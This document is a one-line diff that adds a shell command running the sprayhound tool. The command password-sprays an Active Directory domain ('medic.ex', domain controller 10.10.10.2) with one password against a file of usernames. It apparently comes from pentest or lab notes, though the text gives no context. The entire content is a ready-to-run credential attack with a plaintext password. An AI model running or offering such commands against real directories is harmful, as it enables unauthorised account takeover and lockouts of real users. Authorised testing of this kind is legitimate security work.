@@ -1,0 +1,1 @@
+sprayhound -U ./utilisateurs.txt -p Medicex1 -d medic.ex -dc 10.10.10.2
